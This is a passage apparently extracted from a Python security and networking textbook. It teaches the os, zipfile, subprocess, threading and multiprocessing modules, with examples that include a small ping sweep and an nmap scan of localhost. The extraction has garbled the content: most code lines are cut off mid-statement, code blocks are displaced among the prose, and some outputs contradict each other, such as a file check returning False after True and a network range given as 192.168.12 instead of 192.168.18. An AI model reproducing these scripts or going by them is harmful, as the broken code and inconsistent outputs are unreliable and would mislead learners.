Figure 1.1: Running a script in the Python shell
In the preceding screenshot, we can see the output in the Python
shell and the exception is related to File not found.
PyCharm
PyCharm (https://www.jetbrains.com/pycharm) is a multi-
platform tool that we can ﬁnd for many operating systems, such as
Windows, Linux, and macOS X. There are two versions of PyCharm,
community and technical, with variations in functionality relating to

web framework integration and support for databases. The main
advantages of this development environment are as follows:
Autocomplete, syntax highlighter, analysis tool, and refactoring
Integration with web frameworks, such as Django and Flask
An advanced debugger
Connection with version control systems, such as Git, CVS, and
SVN
In the following screenshot, we can see how to conﬁgure
virtualenv in PyCharm:
Figure 1.2: Conﬁguring virtualenv in PyCharm
In the preceding screenshot, we are seĴing the conﬁguration related
to establishing a new environment for the project using Virtualenv.

Debugging with PyCharm
In this example, we are debugging a Python script that is applying
simple inheritance. An interesting topic is the possibility of adding a
breakpoint to our script. In the following screenshot, we are seĴing a
breakpoint in the __init__ method of the class ChildClass:
Figure 1.3: SeĴing a breakpoint in PyCharm
With the View Breakpoint option, we can see the breakpoint
established in the script:

Figure 1.4: Viewing breakpoints in PyCharm
In the following screenshot, we can visualize the values of the
parameters that contain the values we are debugging:

Figure 1.5: Debugging variables in PyCharm
In this way, we can know the state of each of the variables at
runtime, as well as modify their values to change the logic of our
script.
Summary
In this chapter, we learned how to install Python on the Windows
and Linux operating systems. We reviewed the main data structures
and collections, such as lists, tuples, and dictionaries. We also
reviewed functions, managing exceptions, and how to create classes
and objects, as well as the use of aĴributes and special methods.
Then we looked at development environments and a methodology
to introduce into programming with Python. Finally, we reviewed
the main development environments, PyCharm and Python IDLE,
for script development in Python.
In the next chapter, we will explore programming system packages
for working with operating systems and ﬁlesystems, threads, and

concurrency.
Questions
As we conclude, here is a list of questions for you to test your
knowledge regarding this chapter’s material. You will ﬁnd the
answers in the Assessments section of the Appendix:
1. Which data structure in Python allows us to associate values
with keys?
2. What are the methods we can use to add elements to a list?
3. What is the approach that we can follow in Python to handle
ﬁles and manage exceptions in an easy and secure way?
4. What is the Python parent class for errors related to
input/output?
5. What are the Python modules that enable you to build virtual
environments?
Further reading
In these links, you will ﬁnd more information about the
aforementioned tools and the oﬃcial Python documentation for
some of the modules we have analyzed:
Python 3.10 version library:
https://docs.python.org/3.10/library
Virtualenv documentation:
https://virtualenv.pypa.io/en/latest/

Python Integrated Development Environments:
https://wiki.python.org/moin/IntegratedDevelopmentE
nvironments
Join our community on Discord
Join our community’s Discord space for discussions with the author
and other readers:
https://packt.link/SecNet

2
System Programming Packages
In this chapter, we continue to move forward with learning about
the diﬀerent ways to interact with the operating system (OS) and
the ﬁlesystem. The knowledge you will gain from this chapter about
the diﬀerent programming packages will prove to be very useful in
automating certain tasks that can increase the eﬃciency of our
scripts.
Throughout this chapter, we will look at the main modules we can
ﬁnd in Python for working with the operating and ﬁlesystem. Also,
we will review how to work with the subprocess module for
command execution. Finally, we’ll review thread management and
other modules for multithreading and concurrency. The following
topics will be covered in this chapter:
Interact with the OS in Python
Work with the ﬁle system in Python
Executing commands with the subprocess module
Work with threads in Python
Multithreading and concurrency in Python
Technical requirements

You will need some basic knowledge about command execution in
operating systems to get the most out of this chapter. Also, before
you begin, install the Python distribution on your local machine. We
will work with Python version 3.10, which is available at
https://www.python.org/downloads.
Some of the examples in this chapter require the installation of the
following programs:
Nmap port scanner: https://nmap.org/ 
The examples and source code for this chapter are available in the
GitHub repository at
https://github.com/PacktPublishing/Python-for-Security-
and-Networking.
Check out the following video to see the Code in Action:
https://packt.link/Chapter02.
Interact with the operating system in
Python
The OS module is one of the best mechanisms to access the diﬀerent
functions in our operating system. Your use of this module will
depend on which operating system is being used. For example, you
need to use diﬀerent commands depending on whether you are
executing on Windows or Linux operating system because the
ﬁlesystems are diﬀerent.

This module enables us to interact with the operating environment,
ﬁlesystem, and permissions. You can ﬁnd the following code in the
check_filename.py ﬁle in the os_module subfolder:
In the previous code, we check whether the name of a text ﬁle
passed as a command-line argument exists as a ﬁle, and if the
current user has read permissions to that ﬁle.
The execution of the previous script requires passing a ﬁlename
parameter to check whether it exists or not. To do this, we use the
instruction that checks if we are passing two arguments. The
following is an example of an execution with a ﬁle that doesn’t exist:
$ python check_filename.py file_not_exits.py 
file_not_exits.py 
[+] file_not_exits.py does not exist. 
import sys 
import os 
if len(sys.argv) == 2: 
    filename = sys.argv[1] 
    if not os.path.isfile(filename): 
        print('[-] ' + filename + ' does not exist.
        exit(0) 
    if not os.access(filename, os.R_OK): 
        print('[-] ' + filename + ' access denied.')
        exit(0) 

Besides this, we can also use the os module to list the contents of the
current working directory with the os.getcwd() method. You can
ﬁnd the following code in the show_content_directory.py ﬁle in
the os_module subfolder:
import os 
pwd = os.getcwd() 
list_directory = os.listdir(pwd) 
for directory in list_directory: 
    print('[+] ',directory) 
These are the main steps for the previous code:
Call the os.getcwd() method to retrieve the current working
directory path and store that value on the pwd variable.
Call the os.listdir() method to obtain the ﬁlenames and
directories in the current working directory.
Iterate over the list directory to get the ﬁles and directories.
The following are the main methods for recovering information from
the os module:
os.system() allows us to execute a shell command.
os.listdir(path) returns a list with the contents of the
directory passed as an argument.
os.walk(path) navigates all the directories in the provided
path directory, and returns three values: the path directory, the
names of the subdirectories, and a list of ﬁlenames in the current
directory path.

Let’s understand how the os.listdir(path) and os.walk(path)
methods work. In the following example, we check the ﬁles and
directories inside the current path. You can ﬁnd the following code
in the check_files_directory.py ﬁle in the os_module
subfolder:
Python comes with two diﬀerent functions that can return a list of
ﬁles. The ﬁrst option is to use the os.listdir() method. This
method oﬀers the possibility to pass a speciﬁc path as a parameter. If
you don’t pass a ﬁle path parameter, you’ll get the names of the ﬁles
in the current directory.
The other alternative is to use the os.walk() method, which acts as
a generator function. That is, when executed, it returns a generator
object, which implements the iteration protocol.
In each iteration, this method returns a tuple containing three
elements:
The current path as a directory name
A list of subdirectory names
import os 
for root, directories, files in os.walk(".",topdown=
# Iterate over the files in the current "root" 
    for file_entry in files: 
        # create the relative path to the file 
        print('[+] ',os.path.join(root,file_entry)) 
        for name in directories: 
            print('[++] ',name) 

A list of non-directory ﬁlenames
So, it’s typical to invoke os.walk such that each of these three
elements is assigned to a separate variable in the for loop:
The previous for loop will continue while subdirectories are
processing in the current directory. For example, the previous code
will print all the subdirectories under the current directory.
In the following example, we are using the os.walk() method for
counting the number of ﬁles under the current directory. You can
ﬁnd the following code in the count_files_directory.py ﬁle in
the os_module subfolder:
In the preceding code, we initialize the file_count variable and
increment every time we ﬁnd a ﬁlename inside the current directory.
In the following example, we are counting how many ﬁles there are
of each type. For this task, we can use the
>>> import os 
>>> for currentdir, dirnames, filenames in os.walk(
...     print(filenames) 
import os 
file_count = 0  
for currentdir, dirnames, filenames in os.walk('.')
    file_count += len(filenames)  
print("The number of files in current directory are

os.path.splitext(filename) method, which returns the
ﬁlename and the extension itself. You can count the items using the
Counter class from the collections module.
You can ﬁnd the following code in the
count_files_extension_directory.py ﬁle in the os_module
subfolder:
The previous code goes through each directory under the current
directory and gets the extension for each ﬁlename. We use this
extension in the counts dictionary for storing the number of ﬁles for
each extension. Finally, you can use the items() method to print
keys and values from that dictionary.
Also, we could use the os interface to get access to system
information and get the environment variables in your operating
system. You can ﬁnd the following code in the
get_os_environment_variables.py ﬁle in the os_module
subfolder:
import os 
from collections import Counter 
counts = Counter() 
for currentdir, dirnames, filenames in os.walk('.')
    for filename in filenames: 
        first_part, extension = os.path.splitext(fil
        counts[extension] += 1
for extension, count in counts.items(): 
    print(f"{extension:8}{count}") 

#!/usr/bin/python3
import os 
print(os.getcwd()) 
print(os.getuid()) 
print(os.getenv("PATH")) 
print(os.environ) 
for environ in os.environ: 
    print(environ) 
for key, value in os.environ.items(): 
    print(key,value) 
When executing the previous script, you can see some of the
environment variables deﬁned in your operating system, for
example, those related to your Python installation:
$ python get_os_environment_variables.py  
CONDA_EXE /home/linux/anaconda3/bin/conda 
CONDA_PYTHON_EXE /home/linux/anaconda3/bin/python 
CONDA_SHLVL 1 
CONDA_PREFIX /home/linux/anaconda3 
CONDA_DEFAULT_ENV base 
CONDA_PROMPT_MODIFIER (base) 
Working with the filesystem in
Python
When working with ﬁles, it is important to be able to move through
the ﬁlesystem and determine the type of ﬁle using the os module.

Also, you may want to traverse the ﬁlesystem or determine where
ﬁles are to manipulate them. Throughout this section, we explain
how we can work with the ﬁlesystem, accessing ﬁles, and
directories, and how we can work with ZIP ﬁles.
Working with files and directories
As we have seen in the previous section, it can be interesting to ﬁnd
new folders by iterating recursively through the main directory. In
this example, we see how we can recursively search inside a
directory and get the names of all ﬁles inside that directory:
>>> import os 
>>> file in os.walk("/directory"): 
>>> print(file) 
Also, we can execute other tasks like checking whether a certain
string is a ﬁle or directory. For this task, we can use the
os.path.isfile() method, which returns True if the parameter is
a ﬁle and False if it is a directory:
>>> import os 
>>> os.path.isfile("/directory") 
False 
>>> os.path.isfile("file.py") 
True 
If you need to check whether a ﬁle exists in the current working path
directory, you can use the os.path.exists() method, passing as a

parameter the ﬁle or directory you want to check:
>>> import os 
>>> os.path.exists("file.py") 
False 
>>> os.path.exists("file_not_exists.py") 
False 
If you need to create a new directory folder, you can use the
os.makedirs ('my_directory') method. In the following
example, we are testing the existence of a directory and creating a
new directory if this directory is not found in the ﬁlesystem:
>>> import os 
>>> if not os.path.exists('my_directory'): 
...     try: 
...             os.makedirs('directory') 
...     except OSError as error: 
...             print(error) 
From the developer’s point of view, it is a good practice to check ﬁrst
whether the directory exists or not with the
os.path.exists('my_directory') method. If you want extra
security and to catch any potential exceptions, you can wrap your
call to os.makedirs('my_directory') in a try...except block.
Other features that provide the os module for working with the
ﬁlesystem include geĴing information about a speciﬁc ﬁle. For
example, we can access stats information for a ﬁle. You can ﬁnd the

following code in the file_stats.py ﬁle in the os_module
subfolder:
When executing the previous script, you can see some information
about the ﬁle like creation and modiﬁcation dates, size, owner and
mode:
$ python get_files_stats.py 
file stats: file_stats.py 
- created: Thu Oct 20 15:18:45 2022 
- last accessed: Thu Oct 20 15:18:45 2022 
- last modified: Thu Oct 20 15:18:45 2022 
- Size: 378 bytes 
- owner: 1000 1000 
- mode: 0o100644 
import os 
import time 
file = "file_stats.py" 
st = os.stat(file) 
print("file stats: ", file) 
mode, ino, dev, nlink, uid, gid, size, atime, mtime,
print("- created:", time.ctime(ctime)) 
print("- last accessed:", time.ctime(atime)) 
print("- last modified:", time.ctime(mtime)) 
print("- Size:", size, "bytes") 
print("- owner:", uid, gid) 
print("- mode:", oct(mode)) 

Another interesting functionality that we could implement is to
check the extensions of the ﬁles.
You can ﬁnd the following code in the get_files_extensions.py
ﬁle in the os_module subfolder:
import os 
extensions = ['.jpeg','.jpg','.txt','.py'] 
for extension in extensions: 
    print("Files with extension ",extension) 
    for path,folder,files in os.walk("."): 
        for file in files: 
            if file.endswith(extension): 
                print(os.path.join(path,file)) 
In the execution of the previous script, we can see those ﬁles that
have a .py extension.
$ python get_files_extensions.py. 
Files with extension .py 
./show_content_directory.py 
./count_files_directory.py 
./file_stats.py 
./count_files_extension_directory.py 
./check_files_directory.py 
./get_os_environment_variables.py 
./get_files_extensions.py 
./check_filename.py 

Now that you know how to work with the os module, let’s move on
to learning how we can work with the zipfile module for working
with ZIP ﬁles in Python.
Reading a ZIP file using Python
You may want to retrieve a ZIP ﬁle and extract its contents. In
Python 3, you can use the zipfile module to read it in memory.
The following example lists all the ﬁlenames contained in a ZIP ﬁle
using Python’s built-in zipfile library.
You can ﬁnd the following code in the read_zip_file.py ﬁle in the
zipfile subfolder:
#!/usr/bin/env python3
import zipfile 
def list_files_in_zip(filename): 
        with zipfile.ZipFile(filename) as myzip: 
                for zipinfo in myzip.infolist(): 
                        yield zipinfo.filename 
for filename in list_files_in_zip("files.zip"): 
        print(filename) 
The previous code lists all the ﬁles inside a ZIP archive and the
list_files_in_zip((filename) method returns the ﬁlenames
using the yield instruction.
For more information about the zip module, you can
check out the oﬃcial documentation at

https://docs.python.org/3/library/zipfile.ht
ml.
The main advantage of using these methods is that they provide an
easy way by which you can automate the process of managing ﬁles
within the operating system.
Now that you know how to work with ﬁles, let’s move on to
learning how we can work with the subprocess module in Python.
Executing commands with the
subprocess module
The subprocess module enables us to invoke and communicate with
Python processes, send data to the input, and receive the output
information. Usage of this module is the preferred way to execute
and communicate with operating system commands or start
programs.
This module allows us to run and manage processes directly from
Python. That involves working with stdin standard input, standard
output, and return codes.
The simplest way to execute a command or invoke a process with
the subprocess module is via the run() method, which runs a
process with diﬀerent arguments and returns an instance of the
completed process. This instance will have aĴributes of arguments,
return code, standard output (stdout), and standard error (stderr):
run(*popenargs, input=None, capture_output=False, ti

The previous method gets the popenargs argument, which contains
a tuple containing the command and the arguments to execute. We
can use the argument stdout = subprocess.PIPE to get the
standard output on stdout when the process is ﬁnished and we will
do the same with stderr, that is, stderr = subprocess.PIPE to get
the standard error.
If the check argument is equal to True, and the exit code is not
zero, an exception of type CalledProcessError is thrown. If a
value is given to the timeout in seconds, and the process takes longer
than indicated, an exception of type TimeoutExpired will occur.
There is an optional argument called input that allows you to pass
bytes or a string to the standard input (stdin). Communication by
default is done in bytes; therefore, any input should be in bytes and
stdout and stderr will be as well. If the communication is done in
text mode as strings, stdin, stdout, and stderr will also be text
strings. The following example runs the ls -la command, which
displays the ﬁles found in the current directory.
You can handle the exception with the check = True argument,
like in the following example where we raise an exception by
searching a folder that doesn’t exist.
>>> import subprocess 
>>> process = subprocess.run(('ls','-la'),stdout = s
>>> print(process.stdout.decode("utf-8")) 

Sometimes it’s useful to throw an exception if a program you’re
running returns a bad exit code. We can use the check=True
argument to throw an exception if the external program returns a
non-zero exit code. You can ﬁnd this code in the
subprocess_exception.py ﬁle in the subprocess subfolder:
In the execution output, we can see how the corresponding
exception is thrown:
>>> try: 
>>>    process = subprocess.run(('find','/folder_not
>>>    print(process.stdout.decode("utf-8")) 
>>> except subprocess.CalledProcessError as error: 
>>>     print('Error:', error) 
import subprocess 
import sys  
result = subprocess.run([sys.executable, "-c", "rais
Traceback (most recent call last): 
  File "<string>", line 1, in <module> 
ValueError: error 
Traceback (most recent call last): 
  File "subprocess_exception.py", line 4, in <module
    result = subprocess.run([sys.executable, "-c", "
  File "/home/linux/anaconda3/lib/python3.8/subproce
    raise CalledProcessError(retcode, process.args, 
subprocess.CalledProcessError: Command '['/home/linu

If we run the process using subprocess.run(), our parent process
hangs for as long as it takes for the child process to return the
response. Once the thread is launched, our main process blocks and
only continues when the thread terminates. The method
subprocess.run() includes the timeout argument to allow you to
stop an external program if it takes too long to execute. You can ﬁnd
this code in the subprocess_timeout.py ﬁle in the subprocess
subfolder:
If we execute the previous code, we will obtain a
subprocess.TimeoutExpired exception. In the previous code, the
process we tried to run is using the time.sleep() function to wait
for 10 seconds. However, we pass the argument timeout=5 to kill
our thread after 5 seconds. This explains why our invocation of the
subprocess.run() method is generating a
subprocess.TimeoutExpired exception.
Programs sometimes expect input to be passed through the stdin
argument. The input argument allows you to pass data to the
thread’s standard input. You can ﬁnd this code in the
subprocess_input.py ﬁle in the subprocess subfolder:
import subprocess 
import sys 
result = subprocess.run([sys.executable, "-c", "impo

In the code above, the input argument can be useful if you want to
chain multiple invocations by passing the output of one process as
the input of another.
Another way to execute a command or invoke a process with the
subprocess module is via the call() method. For example, the
following code executes a command that lists the ﬁles in the current
directory. You can ﬁnd this code in the subprocess_call.py ﬁle in
the subprocess subfolder:
In the preceding code, we are using the subprocess module to list the
ﬁles in the current directory.
Running a child process with your subprocess is simple. We can use
the Popen method to start a new process that runs a speciﬁc
import subprocess 
import sys 
result = subprocess.run( 
    [sys.executable, "-c", "import sys; print(sys.st
) 
#!/usr/bin/python3
import os 
from subprocess import call 
print("Current path",os.getcwd()) 
print("PATH Environment variable:",os.getenv("PATH")
print("List files using the subprocess module:") 
call(["ls", "-la"]) 

command. In the following example, we are using the Popen
method to execute a ping command. You can ﬁnd this code in the
subprocess_ping_command.py ﬁle in the subprocess subfolder:
In the previous code, we are using the subprocess module to call the
ping command and obtain the output of this command to evaluate
whether a speciﬁc domain responds with ECHO_REPLY. The
following is an example of the execution of the previous script:
import subprocess 
import sys 
print("Operating system:",sys.platform) 
if sys.platform.startswith("linux"): 
    command_ping ='/bin/ping'
elif sys.platform == "darwin": 
    command_ping ='/sbin/ping'
elif os.name == "nt": 
    command_ping ='ping' 
ping_parameter ='-c 1' 
domain = "www.google.com" 
p = subprocess.Popen([command_ping,ping_parameter,do
out = p.stderr.read(1) 
sys.stdout.write(str(out.decode('utf-8'))) 
sys.stdout.flush() 
PING www.google.com (142.250.184.4) 56(84) bytes of 
64 bytes from mad41s10-in-f4.1e100.net (142.250.184
 --- www.google.com ping statistics --- 

The Popen function has the advantage of giving more ﬂexibility if
we compare it with the call function, since it executes the
command as a child program in a new process. The following script
is very similar to the previous one. The diﬀerence is that we are
using a for loop for iterating with some network machines.
You can ﬁnd the following code in the
subprocess_ping_network.py ﬁle in the subprocess subfolder:
1 packets transmitted, 1 received, 0% packet loss, t
rtt min/avg/max/mdev = 9.566/9.566/9.566/0.000 ms 
#!/usr/bin/env python
from subprocess import Popen, PIPE 
import sys 
print("Operating system:",sys.platform) 
if sys.platform.startswith("linux"): 
    command_ping ='/bin/ping'
elif sys.platform == "darwin": 
    command_ping ='/sbin/ping'
elif os.name == "nt": 
    command_ping ='ping'
for ip in range(1,4): 
    ipAddress = '192.168.18.'+str(ip) 
    print("Scanning %s " %(ipAddress)) 
    subprocess = Popen([command_ping, '-c 1',ipAddre
    stdout, stderr= subprocess.communicate(input=Non
    print(stdout) 
    if b"bytes from " in stdout: 
        print("The Ip Address %s has responded with 

The following is an example of the execution of the previous script:
The execution of the previous script will send ICMP requests to
three IP addresses within the 192.168.12 network range.
The following script executes the nmap command on the localhost
machine at IP address 127.0.0.1. You can ﬁnd the following code
in the subprocess_nmap.py ﬁle in the subprocess subfolder:
When executing the previous script, we can see the output of the
nmap process. The output will vary depending on the host machine
you are checking.
Scanning 192.168.18.1  
b'PING 192.168.18.1 (192.168.18.1) 56(84) bytes of d
The Ip Address b'192.168.18.1' has responded with a 
Scanning 192.168.18.2  
b'PING 192.168.18.2 (192.168.18.2) 56(84) bytes of d
ping statistics ---\n1 packets transmitted, 0 receiv
Scanning 192.168.18.3  
b'PING 192.168.18.3 (192.168.18.3) 56(84) bytes of d
from subprocess import Popen, PIPE 
process = Popen(['nmap','127.0.0.1'], stdout=PIPE, s
stdout, stderr = process.communicate() 
print(stdout.decode()) 

The following script will check if we have a speciﬁc program
installed in our operating system. You can ﬁnd the following code in
the subprocess_program_checker.py ﬁle in the subprocess
subfolder:
When executing the previous script, if the program is installed in the
operating system, it shows the path where it is installed. If it can’t
$ python subprocess_nmap.py 
Nmap scan report for localhost (127.0.0.1) 
Host is up (0.00014s latency). 
Not shown: 996 closed tcp ports (conn-refused) 
PORT     STATE SERVICE 
22/tcp   open  ssh 
80/tcp   open  http 
631/tcp  open  ipp 
6789/tcp open  ibm-db2-admin 
Nmap done: 1 IP address (1 host up) scanned in 0.08 
import subprocess 
program = input('Enter a process in your operating s
process = subprocess. run(['which', program], captur
if process.returncode == 0: 
    print(f'The process "{program}" is installed') 
    print(f'The location of the binary is: {process
else: 
    print(f'Sorry the {program} is not installed') 
    print(process.stderr) 

ﬁnd the program, it returns an error. If the operating system used
during the execution is Linux-based, it will return also information
about the path it aĴempted to use to search the command.
You can get more information about the Popen
constructor and the methods that provide the Popen
class in the oﬃcial documentation at
https://docs.python.org/3/library/subprocess
.html#popen-constructor.
The diﬀerence between using subprocess.run() and
subprocess.Popen() is that the core of the subprocess module is
the subprocess.Popen() function. The subprocess.run()
method was added in Python 3.5 and is a wrapper over subprocess.
Popen was created to integrate and unify its operation. It basically
allows you to run a command on a thread and wait until it ﬁnishes.
The run() method blocks the main process until the command
executed in the child process ﬁnishes, while with subprocess.
$ python subprocess_program_checker.py  
Enter a process in your operating system:python 
The process "python" is installed 
The location of the binary is: /home/linux/anaconda3
$ python subprocess_program_checker.py 
Enter a process in your operating system:go 
Sorry the go is not installed 
which: no go in (/home/linux/anaconda3/bin:/home/lin

Popen you can continue to execute parent process tasks in the
parallel, calling subprocess.communicate to pass or receive data
from the threads whenever desired.
Setting up a virtualenv with
subprocess
One of the things you can do with Python is process automation. For
example, we could develop a script that creates a virtual
environment and tries to ﬁnd a ﬁle called requirements.txt in the
current directory to install all dependencies. You can ﬁnd the
following code in the subprocess_setup_venv.py ﬁle in the
subprocess subfolder:
In the previous code, we are checking if we have Python installed on
our system. If so, it returns the path where it is installed. We
continue executing a process for creating a virtual environment.
import subprocess 
from pathlib import Path 
VENV_NAME = '.venv' 
REQUIREMENTS = 'requirements.txt' 
process = subprocess.run(['which', 'python3'], captu
if process.returncode != 0: 
    raise OSError('Sorry python3 is not installed') 
python_process = process.stdout.strip() 
print(f'Python found in: {python_process}') 

In the previous code, we are using the subprocess module, which
allows us to execute the python process for creating a virtual
environment.
In the previous code, we are using the pathlib module, which
allows us to determine if the requirements.txt ﬁle exists. When
you execute the script, you’ll get some helpful messages about
what’s going on with the operating system.
process = subprocess.run('echo "$SHELL"', shell=True
shell_bin = process.stdout.split('/')[-1] 
create_venv = subprocess.run([python_process, '-m', 
if create_venv.returncode == 0: 
    print(f'Your venv {VENV_NAME} has been created')
else: 
    print(f'Your venv {VENV_NAME} has not been creat
pip_process = f'{VENV_NAME}/bin/pip3'
if Path(REQUIREMENTS).exists(): 
    print(f'Requirements file "{REQUIREMENTS}" found
    print('Installing requirements') 
    subprocess.run([pip_process, 'install', '-r', RE
print('Process completed! Now activate your environm
$ python subprocess_setup_venv.py 
Python found in: /home/linux/anaconda3/bin/python3 
Your venv .venv has been created 
Process completed! Now activate your environment wit

The main advantage of using these modules is that they allow us to
abstract ourselves from the operating system and we can perform
diﬀerent operations regardless of the operating system we are using.
The subprocess module is a powerful part of the Python standard
library that allows you to easily run external programs and inspect
their results. In this section, you learned how to use subprocess
module to control external programs, pass input to them, parse their
results, and check their return codes. Now that you know how to
work with subprocess module, let’s move on to learning how we can
work with threads in Python.
Managing threads in Python
1. Threading is a programming technique that allows an
application to simultaneously execute several operations in the
same memory space allocated to the process. Each execution
stream that originates during processing is called a thread and
can perform one or more tasks.
2. Threads allow our applications to execute multiple operations
concurrently in the same process space. In Python, the
threading module makes programming with threads possible.
Among the possible states of a thread, we can highlight:
New, a thread that has not been started yet and no
resources have been allocated.
Runnable, the thread is waiting to run.
Running, the thread is being executed.

Not-running, the thread has been paused because another
thread took precedence over it or because the thread is
waiting for a long-running I/O operation to complete.
Finished, the thread has ﬁnished its execution.
Creating a simple thread
For working with threads in Python, we can work with the
threading module, which provides a more convenient interface
and allows developers to work with multiple threads. The easiest
way to use a thread is to instantiate an object of the Thread class
with a target function and call its start() method.
Threads can be passed parameters, which are then used by the target
function. Any type of object can be passed as a parameter to a
thread. In the following example, we are creating four threads, and
each one prints a diﬀerent message, which is passed as a parameter
in the thread_message (message) method. You can ﬁnd the
following code in the threading_init.py ﬁle in the threading
subfolder:
We can see more information about the start() method for starting
a thread if we invoke the help(threading.Thread) command:
import threading 
def myTask(): 
    print("Hello World: {}".format(threading.current
myFirstThread = threading.Thread(target=myTask) 
myFirstThread.start() 

Documentation about the threading module is
available at
https://docs.python.org/3/library/threading.
html.
Working with the threading module
The threading module contains a Thread class, which we need to
extend to create our own execution threads. The run method will
contain the code we want to execute on the thread.
Before we build a new thread in Python, let’s review the
__init__() method constructor for the Python Thread class to see
which parameters we need to pass in:
The Thread class constructor accepts ﬁve arguments as parameters:
start(self) 
|            Start the thread's activity. 
|            It must be called at most once per thre
|            object's run() method to be invoked in 
|            This method will raise a RuntimeError i
|            same thread object. 
# Python Thread class Constructor
def __init__(self, group=None, target=None, name=Non

group: A special parameter that is reserved for future
extensions
target: The callable object to be invoked by the run() method
name: The thread’s name
args: An argument tuple for target invocation
kwargs: A dictionary keyword argument to invoke the base
class constructor
Let’s create a simple script that we’ll then use to create our ﬁrst
thread. You can ﬁnd the following code in the
threading_logging.py ﬁle in the threading subfolder:
In the preceding code, we are declaring two functions
thread(name) and check_state(thread) to use for executing and
import threading 
import logging 
import time 
logging.basicConfig(level=logging.DEBUG,format='[%(l
def thread(name): 
    logging.debug('Starting Thread '+ name) 
    time.sleep(5) 
    print("%s: %s" % (name, time.ctime(time.time()))
    logging.debug('Stopping Thread '+ name) 
def check_state(thread): 
    if thread.is_alive(): 
        print(f'Thread {thread.name} is alive.') 
    else: 
        print(f'Thread {thread.name} it not alive.')

checking the state for each thread created. Also, we are using the
logging module for debugging and monitoring the behavior
related to threads.
In our main program, we are declaring two threads and calling the
start() method of the Thread class to execute the code deﬁned in
the myTask() method and the join() method allows us to
synchronize the main process and the new thread.
Additionally, we could use the is_alive() method to determine if
the thread is still running or has already ﬁnished. In addition, it
oﬀers us the ability to work with multiple threads where each one
runs independently without aﬀecting the behavior of the other.
Another way to deﬁne our own thread is to deﬁne a class that
inherits from the threading.Thread class. Within this class, we can
deﬁne the __init__() constructor function in order to initialize
th1 = threading.Thread(target=thread, args=('MyThrea
th2 = threading.Thread(target=thread, args=('MyThrea
th1.setDaemon(True) 
th1.start() 
th2.start() 
check_state(th1) 
check_state(th2) 
while(th1.is_alive()): 
    logging.debug('Thread is executing...') 
    time.sleep(1) 
th1.join() 
th2.join() 

parameters and variables that will be used within the class. After
initializing all the variables and functions of the class, we deﬁne the
run() method that contains the code we want to execute when we
call the start() method.
Now, let’s create our thread. In the following example, we are
creating a class called MyThread that inherits from
threading.Thread. The run() method contains the code that
executes inside each of our threads, so we can use the start()
method to launch a new thread.
You can ﬁnd the following code in the threading_run.py ﬁle in the
threading subfolder:
import threading 
class MyThread(threading.Thread): 
    def __init__ (self, message): 
        threading.Thread.__init__(self) 
        self.message = message 
    def run(self): 
        print(self.message) 
def test(): 
    for num in range(0, 10): 
        thread = MyThread("I am the "+str(num)+" thr
        thread.name = num 
        thread.start() 
if __name__ == '__main__': 
    import timeit 
    print(timeit.timeit("test()", setup="from __main

In the previous code, we use the run() method from the Thread
class to include the code that we want to execute for each thread in a
concurrent way.
Additionally, we can use the thread.join() method to wait for the
thread to ﬁnish. The join method is used to block the thread until
the thread ﬁnishes its execution. You can ﬁnd the following code in
the threading_join.py ﬁle in the threading subfolder:
import threading 
class thread_message(threading.Thread): 
    def __init__ (self, message): 
        threading.Thread.__init__(self) 
        self.message = message 
    def run(self): 
        print(self.message) 
threads = [] 
def test(): 
    for num in range(0, 10): 
        thread = thread_message("I am the "+str(num)
        thread.start() 
        threads.append(thread) 
    # wait for all threads to complete by entering t
    for thread in threads: 
        thread.join() 
if __name__ == '__main__': 
    import timeit 
    print(timeit.timeit("test()", setup="from __main

The main thread in the previous code does not ﬁnish its execution
before the child process, which could result in some platforms
terminating the child process before the execution is ﬁnished. The
join method may take as a parameter a ﬂoating-point number that
indicates the maximum number of seconds to wait. Also, we used
the timeit module to get the times of the thread’s executions. In
this way, you can compare time execution between them.
To tune the behavior of programs that are using threads, it is best to
have the ability to pass values to threads. That’s what the args and
kwargs arguments in the constructor are for. The previous code uses
these arguments to pass a variable with the number of the thread
currently running and a dictionary with three values that set how
the counter works across all threads.
Now that you know how to work with threads, let’s move on to
learning how we can work with multithreading and concurrency in
Python.
Multiprocessing in Python
On operating systems that implement a forked system call,
multiprocessing, rather than threads, can be easily created to handle
concurrency. Because it uses sub-processing instead of threading, it
allows multiple concurrent operations to be carried out without the
limitations of the Global Interpreter Lock (GIL) on Unix and
Windows systems.
Working with processes is very similar to working with threads. The
diﬀerence is that you need to use the multiprocessing module

instead of the threading module. In this case, the Process()
method should be used, which works in a similar way to using the
Thread() method of the threading module.
In the following example, we are using Process() method to create
two processes and each one is associated with a thread. You can ﬁnd
the following code in the multiprocessing_process.py ﬁle in the
multiprocessing subfolder:
In our main program, we create 2 process instances and check their
status using the check_state() method, which internally calls the
is_alive() method to determine if the process is running.
import multiprocessing 
import logging 
import time 
logging.basicConfig(level=logging.DEBUG,format='[%(l
def thread(name): 
    logging.debug('Starting Process '+ name) 
    time.sleep(5) 
    print("%s: %s" % (name, time.ctime(time.time()))
    logging.debug('Stopping Process '+ name) 
def check_state(process): 
    if process.is_alive(): 
        print(f'Process {process.name} is alive.') 
    else: 
        print(f'Process {process.name} is not alive

Multithreading and concurrency in
Python
The concept behind multithreading applications is that it allows us
to provide copies of our code on additional threads and execute
them. This allows the execution of multiple operations at the same
time. Additionally, when a process is blocked, such as waiting for
input/output operations, the operating system can allocate
computing time to other processes.
When we mention multithreading, we are referring to a processor
that can simultaneously execute multiple threads. These typically
have two or more threads that actively compete within a kernel for
execution time, and when one thread is stopped, the processing
kernel will start running another thread.
The context between these subprocesses changes very quickly and
gives the impression that the computer is running the processes in
parallel, which gives us the ability to multitask.
if __name__ == '__main__': 
    process = multiprocessing.Process(target=thread,
    process2 = multiprocessing.Process(target=thread
    check_state(process) 
    check_state(process2) 
    process.start() 
    process2.start() 
    check_state(process) 
    check_state(process2) 

Multithreading in Python
Python provides an API that allows developers to write applications
with multiple threads. To get started with multithreading, we are
going to create a new thread inside a Python class. This class extends
from threading.Thread and contains the code to manage one
thread.
With multithreading, we could have several processes generated
from a main process and could use each thread to execute diﬀerent
tasks in an independent way. You can ﬁnd the following code in the
ThreadWorker.py ﬁle in the multithreading subfolder:
import threading 
class ThreadWorker(threading.Thread): 
    def __init__(self): 
        super(ThreadWorker, self).__init__() 
    def run(self): 
        for i in range(10): 
        print(i) 
Now that we have our ThreadWorker class, we can start to work on
our main class. You can ﬁnd the following code in the main.py ﬁle
in the multithreading subfolder:
import threading  
from ThreadWorker import ThreadWorker 
def main(): 
    thread = ThreadWorker() 
    thread.start() 

if __name__ == "__main__":   
    main() 
In the previous code, we initialized the thread variable as an
